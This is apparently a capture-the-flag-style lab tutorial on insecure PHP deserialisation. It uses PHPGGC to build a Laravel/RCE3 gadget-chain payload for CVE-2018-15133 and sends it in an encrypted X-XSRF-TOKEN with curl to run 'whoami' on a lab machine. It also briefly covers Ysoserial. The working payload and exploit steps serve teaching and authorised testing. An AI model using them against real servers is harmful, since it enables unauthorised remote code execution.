Automating scripts during pen-testing is essential for efficiently identifying and exploiting vulnerabilities in web applications. In this task, we will explore one such tool called **PHP Gadge Chain (PHPGGC)** that plays a crucial role in this process, automating the discovery of insecure deserialisation vulnerabilities. PHPGGC, akin to Ysoserial in the Java ecosystem, helps security professionals assess the security posture of PHP applications and mitigate potential risks.

## PHP Gadget Chain (PHPGGC)  
 PHPGGC is primarily a tool for generating gadget chains used in PHP object injection attacks, specifically tailored for exploiting vulnerabilities related to PHP object serialisation and deserialisation.

**Functionality**
- **Gadget Chains**: PHPGGC provides a library of gadget chains for various PHP frameworks and libraries. These gadget chains are sequences of objects and methods designed to exploit specific vulnerabilities when a PHP application unsafely unserialises user-provided data.  
- **Payload Generation**: The main purpose of PHPGGC is to facilitate the generation of serialised payloads that can trigger these vulnerabilities. It helps security researchers and penetration testers create payloads that demonstrate the impact of insecure deserialisation flaws.
- **Payload Customisation**: Users can customise payloads by specifying arguments for the functions or methods involved in the gadget chain, thereby tailoring the attack to achieve specific outcomes, such as encoding.  

You can download PHPGGC from its [GitHub repository](https://github.com/ambionics/phpggc) or use the version already available on the AttackBox via the `/opt/phpggc` directory. The installed version already contains a few gadget chains, sequences of PHP objects, and method calls designed to exploit deserialisation vulnerabilities. These gadget chains leverage PHP's magic methods to achieve various attack objectives, such as remote code execution.  
To list all available gadget chains, you can use the `-l` option with PHPGGC, which will show the Name, Version, Type and Vector for launching a specific attack. Additionally, you can filter gadget chains based on their capabilities, such as those targeting particular PHP frameworks or achieving specific exploit techniques, using the `-l` option followed by a filter keyword (Drupal, Laravel, etc.). This allows you to select the appropriate gadget chain for your exploitation scenario, as shown below:

```shell-session
thm@machine$ php phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                                                 TYPE                      VECTOR          I    
Bitrix/RCE1                               17.x.x <= 22.0.300                                      RCE: Command              __destruct           
CakePHP/RCE1                              ? <= 3.9.6                                              RCE: Command              __destruct           
CakePHP/RCE2                              ? <= 4.2.3                                              RCE: Command              __destruct           
CodeIgniter4/FD1                          <= 4.3.6                                                File delete               __destruct           
CodeIgniter4/FD2                          <= 4.3.7                                                File delete               __destruct           
CodeIgniter4/FR1                          4.0.0 <= 4.3.6                                          File read                 __toString      *    
CodeIgniter4/RCE1                         4.0.2                                                   RCE: Command              __destruct           
CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                     RCE: Command              __destruct           
CodeIgniter4/RCE3                         4.0.4 <= 4.4.3                                          RCE: Command              __destruct           
CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                              RCE: Command              __destruct         
```

For example, the output for `CakePHP/RCE1` means that the gadget chain named `CakePHP/RCE1` exploits an RCE vulnerability in CakePHP versions of up to `3.9.6`. This vulnerability allows attackers to execute arbitrary commands on the server by leveraging the `__destruct` magic method.

## Exploiting a Web Application
As a pentester, we are focusing on a Laravel website to exploit a known vulnerability identified under [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133). The vulnerability is triggered when Laravel deserialises (unpacks) the untrusted data from the `X-XSRF-TOKEN`. This deserialisation process can lead to executing arbitrary code on the server if not handled securely. The details regarding the vulnerability can be read from the [Laravel security release](https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30), but our main focus will be how we can utilise PHP gadget chains during exploitation. The vulnerability mentioned above can be exploited using three main factors:

- **Step 1**: Requires `APP_KEY` from Laravel, which the framework uses to encrypt the XSRF token.
- **Step 2**: Use PHPGGC to generate an unserialised payload executing a command. This is considered a complex task, and the tool comes to the rescue.
- **Step 3**: Finally, we must encrypt the payload using the APP_KEY and send the POST request. This usually varies from framework to framework.  

In this task, our focus will primarily be on Step 2 and understanding how PHPGGC will assist us as a pentester. Visit the vulnerable Laravel application at [http://MACHINE_IP:8089](http://machine_ip:8089/). As a pentester, we can identify web application versions through multiple techniques.

The Laravel application version is 5.6.29.
	![](Pasted%20image%2020250117000107.png)
- For the first step, we will acquire the APP_KEY through any attack vector, such as social engineering. You can get the `APP_KEY` by visiting [http://MACHINE_IP:8089/get-key](http://machine_ip:8089/get-key). For your convenience, this page will also provide you with the first payload that has the **whoami** command.  
- For the second step, we need to identify the payload we can use.
```shell-session
thm@machine$ php phpggc -l Laravel

Gadget Chains
-------------

NAME                  VERSION           TYPE             VECTOR    
Laravel/RCE1          5.4.27            rce              __destruct
Laravel/RCE2          5.5.39            rce              __destruct
Laravel/RCE3          5.5.39            rce              __destruct
Laravel/RCE4          5.5.39            rce              __destruct
```

Moving forward, we can generate the payload using various gadgets. Each gadget has its relevancy and utilises different classes during the deserialisation process. We will use RCE3 in this example and can generate the payload by typing the command `php phpggc -b Laravel/RCE3 system whoami` for a base-64 encoded payload. A non-encoded payload is shown below:  

```shell-session
thm@machine$ php phpggc Laravel/RCE3 system whoami O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"*events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"*app";s:6:"whoami";s:17:"*defaultChannel";s:1:"x";s:17:"*customCreators";a:1:{s:1:"x";s:6:"assert";}}}
```

Breakdown of the Payload  
- `Illuminate\Broadcasting\PendingBroadcast`: This class handles event broadcasts in Laravel. Here, it's primarily a vehicle for carrying the nested malicious object.
- `Illuminate\Notifications\ChannelManager`: This object manages notification channels. We manipulate it to inject arbitrary code execution through its properties, `*app`, which typically would reference the application service container. We misuse it to hold our command `whoami`. We also manipulated the `*defaultChannel` and `*customCreators` properties that are twisted to create a scenario where the PHP `assert` function is called, executing any code passed to it.

As we already know, Laravel initially employed **encrypted** and **serialised** cookies to securely store session and CSRF token data, using the same methodology for both. If you visit the vulnerable app, you can see the encrypted and serialised cookies, as shown below:
	![](Pasted%20image%2020250117000430.png)
Now that we have the `APP_KEY` and payload, it's time to create an encrypted CSRF token. For the sake of this room, we have prepared a PHP script that would take APP_KEY and payload as arguments and return the encrypted token. You can access the link at [http://MACHINE_IP:8089/cve.php?app_key=xx&payload=xxx](http://machine_ip:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY%3D&payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0%3D). 

For your convenience, this URL already has the URL encoded key and first payload with the **whoami** command. Understanding the encryption mechanism for a framework like Laravel and WordPress is a simple task, but currently, it's out of the scope of the room.

When pen-testing web frameworks like Yii, CakePHP, and Laravel, it's essential to understand that each framework has unique routing and encryption mechanisms despite all being built on PHP. These frameworks are designed with different architectures and security implementations, which means a vulnerability like RCE3 in Laravel, specifically exploiting Laravel's service container and serialisation behaviour, would not necessarily apply to WordPress or other PHP-based systems. WordPress, for instance, has a different structure and does not use Laravel's specific classes or methods, so an exploit tailored for Laravel's architecture won't directly work on WordPress.

Now that we have the encrypted token, we can make a simple POST request using the CSRF token as shown below to execute the command. The payload result will appear at the start of the `cURL` response.

```shell-session
thm@machine$curl 10.10.234.169:8089 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDBhMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ=='| head -n 2
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7245    0  7245    0     0  73181      0 --:--xxxx--:--:-- --:--:--     0
<!DOCTYPE html><!--
100 14485    0 14485    0     0   141k      0 --:--:-- --:--:-- --:--:--  140k
curl: (23) Failed writing body (947 != 7240)
```

## Ysoserial for Java
Ysoserial is a widely recognised exploitation tool specifically crafted to test the security of Java applications against serialisation vulnerabilities. It helps generate payloads that exploit these vulnerabilities, making it an essential tool for attackers and penetration testers who aim to assess and exploit applications that use Java serialisation.

To use Ysoserial, an attacker would typically generate a payload with a command such as `java -jar ysoserial.jar [payload type] '[command to execute]'`, where `[payload type]` is the type of exploit and `[command to execute]` is the arbitrary command they wish to run on the target system. For example, using the `CommonsCollections1` payload type might look like this: `java -jar ysoserial.jar CommonsCollections1 'calc.exe'`. This command generates a serialised object that will execute the specified command when deserialised by a vulnerable application. Ysoserial is available for [download](https://github.com/frohoff/ysoserial) on GitHub.